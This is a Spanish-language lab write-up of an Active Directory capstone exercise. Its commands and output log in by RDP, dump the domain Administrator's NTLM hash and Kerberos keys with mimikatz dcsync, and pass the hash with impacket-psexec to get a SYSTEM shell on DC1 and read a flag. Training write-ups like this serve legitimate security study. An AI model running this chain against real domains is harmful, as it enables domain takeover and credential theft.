# Walk: Lateral Movement in Active Directory - Shadow Copies and Domain Sync - VM Group 2 

## Objetivo

Capstone Exercise: Start VM Group 2 and try to execute the dcsync technique and get access to dc1 in order to get the flag located on the administrator's desktop. 
To do so, log in via RDP as the jeffadmin and perform dcsync against the domain Administrator user to obtain its NTLM hash.

## Herramientas
1. mimikatz
2. impacket-psexec

## Procedimiento y comandos
#### Paso 1: Nos conectamos por RDP
1. Conexion:
```bash
┌──(root㉿kali)-[/home/kali]
└─# xfreerdp /u:"jeffadmin" /p:'BrouhahaTungPerorateBroom2023!' /v:192.168.226.70 /dynamic-resolution +clipboard /cert:ignore 
```
2. Ejecucion mimikatz:
```powershell
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz #
```
#### Paso 2: Obtenemos el hash del administrador del controlador de dominio (DC)

```powershell
mimikatz # lsadump::dcsync /user:corp\administrator
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 8/16/2022 8:27:22 PM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 731b7c2aa33ef31284bed1e7895123de

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-D74CT1583SRAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
      aes128_hmac       (4096) : 3d58eb136242c11643baf4ec85970250
      des_cbc_md5       (4096) : fd79dc380ee989a4
    OldCredentials
      aes256_hmac       (4096) : aefc3b3587d7f6786dd4bd53647bc7ce09148c3556172fd86d2eb24a59924248
      aes128_hmac       (4096) : bae2ca0a0a705c2b965e10321860f4ca
      des_cbc_md5       (4096) : 0e7c641c573ddac2

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-D74CT1583SRAdministrator
    Credentials
      des_cbc_md5       : fd79dc380ee989a4
    OldCredentials
      des_cbc_md5       : 0e7c641c573ddac2


mimikatz #
```

* Revisamos Grupos:

```powershell
PS C:\Tools> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ===============================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON       Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                    Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                       Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
CORP\Domain Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
CORP\Denied RODC Password Replication Group Alias            S-1-5-21-1987370270-658905905-1781884369-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level        Label            S-1-16-12288
PS C:\Tools> net group "Domain Admins" /domain
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            jeffadmin
The command completed successfully.

PS C:\Tools>
```

- **Hash del Admin**: **2892d26cdf84d7a70e2eb3b9f05c425e**

#### Paso 3: Ejecutamos pass the hash

```bash
┌──(root㉿kali)-[/home/…/OffSec/24-ActiveDirectory-LateralMovment/Capstones/lab-1]
└─# impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp/administrator@192.168.226.70
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.226.70.....
[*] Found writable share ADMIN$
[*] Uploading file GPgIpTLc.exe
[*] Opening SVCManager on 192.168.226.70.....
[*] Creating service GcrZ on 192.168.226.70.....
[*] Starting service GcrZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.887]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC1

C:\Windows\system32> cd C:\Users\Administrator\Desktop
 
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 36BF-6CF9

 Directory of C:\Users\Administrator\Desktop

07/08/2025  11:21 AM    <DIR>          .
01/08/2024  05:26 AM    <DIR>          ..
07/08/2025  11:21 AM                78 flag.txt
               1 File(s)             78 bytes
               2 Dir(s)   6,510,776,320 bytes free

C:\Users\Administrator\Desktop> type flag.txt
OS{2158cb8382dd97544090de1f0d740305}

C:\Users\Administrator\Desktop> 
```
## Troubleshooting
## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

